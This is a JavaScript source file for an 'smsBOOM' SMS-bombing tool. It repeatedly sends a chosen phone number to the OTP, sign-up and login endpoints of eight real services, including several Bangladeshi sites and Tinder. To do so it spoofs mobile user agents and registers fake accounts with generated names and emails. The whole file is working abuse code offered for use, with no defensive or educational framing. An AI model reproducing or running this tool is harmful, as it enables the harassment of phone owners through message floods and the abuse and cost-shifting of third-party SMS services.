const request = require("request");
const colors = require("colors");

const moment = require("moment");
const faker = require("faker");

async function delay(s) {
  return new Promise((resolve) => setTimeout(resolve, s * 1000));
}

async function smsBOOM(number, amount) {
  let dataFSms = {
    date: moment().format("DD.MM.YYYY HH:mm:ss"),
    number: number,
    sent: 0,
    faild: 0,
  };

  function ecuriar(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .get(
        `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${no}`
      )
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;

          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function swap(number) {
    request
      .post({
        url: "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en",
        headers: {
          "User-Agent": "Tinder/7.5.3 (iPhone; iOS 10.3.2; Scale/2.00)",
          "Accept-Language": "en",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone: number,
        }),
      })
      .on("response", function (response) {
        if (response.code == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function bdtickets(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://api.bdtickets.com:20100/v1/auth",
        headers: {
          "User-Agent":
            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
          "Accept-Language": "en",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          applicationChannel: "WEB_APP",
          createUserCheck: true,
          phoneNumber: `+88${no}`,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function easybd(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request

      .post({
        url: "https://core.easy.com.bd/api/v1/registration",
        headers: {
          "User-Agent":
            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
          "Accept-Language": "en",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          name: faker.name.firstName(),
          email: faker.internet.email(),
          mobile: no,
          password: "12345678",
          password_confirmation: "12345678",
          device_key: "eca27eb4404c33101098537fff27dab3",
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function rabbithole(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        headers: {
          "User-Agent":
            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
          "Accept-Language": "en",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mobile: `+88${no}`,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function qcoom(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://auth.qcoom.com/api/v1/otp/send",
        headers: {
          "User-Agent":
            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
          "Accept-Language": "en",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mobileNumber: `+88${no}`,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function fundesh(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
        headers: {
          "User-Agent":
            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
          "Accept-Language": "en",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          msisdn: `${no.substring(1)}`,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  //https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web

  function ghoori(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        headers: {
          "User-Agent":
            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
          "Accept-Language": "en",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mobile_no: no,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function send(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    ecuriar(no);
    swap(no);
    bdtickets(no);
    easybd(no);
    rabbithole(no);
    qcoom(no);
    fundesh(no);
    ghoori(no);
  }

  for (let i = 0; i < amount; i++) {
    await delay(5);
    send(number);
  }
}

module.exports = smsBOOM;
